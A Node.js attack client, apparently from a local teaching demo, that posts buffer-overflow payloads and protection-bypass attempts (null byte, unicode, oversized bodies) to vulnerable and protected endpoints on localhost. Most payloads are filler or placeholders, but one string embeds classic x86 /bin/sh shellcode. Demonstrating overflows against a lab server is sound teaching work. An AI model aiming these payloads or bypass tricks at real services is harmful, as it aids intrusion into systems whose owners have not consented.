const axios = require('axios');

class AttackClient {
  constructor(serverUrl) {
    this.serverUrl = serverUrl;
  }

  generateOverflowPayload(size, exploitType = 'basic') {
    const exploits = {
      basic: 'A'.repeat(size),
      shellcode: 'A'.repeat(size - 100) + '\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80',
      returnAddress: 'A'.repeat(size - 8) + '\\xef\\xbe\\xad\\xde', // 0xdeadbeef
      nopSled: '\\x90'.repeat(size - 200) + 'SHELLCODE_HERE',
      memoryCorrupt: 'A'.repeat(size) + 'CORRUPT_MEMORY',
      ropChain: 'A'.repeat(size - 32) + 'ROP_CHAIN_PAYLOAD'
    };

    return exploits[exploitType] || exploits.basic;
  }

  async attemptBufferOverflow(attackType, size = 2000) {
    console.log(`\nATTEMPTING ${attackType.toUpperCase()} BUFFER OVERFLOW ATTACK`);
    console.log(`Payload size: ${size} bytes`);

    const payload = this.generateOverflowPayload(size, attackType);

    try {
      const response = await axios.post(`${this.serverUrl}/api/vulnerable/process`, payload, {
        headers: { 'Content-Type': 'text/plain' }
      });

      console.log('Attack response:', JSON.stringify(response.data, null, 2));

      if (response.data.status === 'overflow_detected' || response.data.warning) {
        console.log('ATTACK SUCCESSFUL! Buffer overflow detected');
        console.log('Overflow effects:', response.data.details?.effects || 'Unknown');
      }

      return response.data;

    } catch (error) {
      if (error.response) {
        console.log('Attack blocked:', error.response.data);
      } else {
        console.error('Attack failed:', error.message);
      }
    }
  }

  async runAttackSuite() {
    console.log('\n=== RUNNING BUFFER OVERFLOW ATTACK SUITE ===');

    const attacks = [
      { type: 'basic', size: 1500 },
      { type: 'shellcode', size: 2000 },
      { type: 'returnAddress', size: 3000 },
      { type: 'nopSled', size: 2500 },
      { type: 'memoryCorrupt', size: 4000 },
      { type: 'ropChain', size: 3500 }
    ];

    for (const attack of attacks) {
      console.log('\n' + '='.repeat(60));
      await this.attemptBufferOverflow(attack.type, attack.size);
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
  }

  async attemptBypassProtection() {
    console.log('\n=== ATTEMPTING TO BYPASS PROTECTION ===');

    const bypassAttempts = [
      { method: 'chunked', payload: this.generateOverflowPayload(2000) },
      { method: 'slowloris', payload: 'A', delay: 1000 },
      { method: 'nullByte', payload: 'A'.repeat(900) + '\0' + 'A'.repeat(100) },
      { method: 'unicode', payload: 'A'.repeat(1000) + '𝓐'.repeat(500) }
    ];

    for (const attempt of bypassAttempts) {
      // console.log(`\nAttempting bypass using ${attempt.method}...`);

      try {
        const response = await axios.post(`${this.serverUrl}/api/protected/process`, attempt.payload, {
          headers: {
            'Content-Type': 'text/plain',
            'Content-Length': attempt.payload.length.toString()
          }
        });

        console.log('Response:', response.data);

      } catch (error) {
        if (error.response) {
          console.log('Protection blocked attempt:', error.response.data);
        }
      }
    }
  }
}

async function runAttackClient() {
  const attacker = new AttackClient('http://localhost:3000');

  console.log('TARGET: Vulnerable Server on http://localhost:3000');
  await attacker.runAttackSuite();

  const protectedAttacker = new AttackClient('http://localhost:3001');
  await protectedAttacker.attemptBypassProtection();
}

if (require.main === module) {
  runAttackClient();
}

module.exports = AttackClient;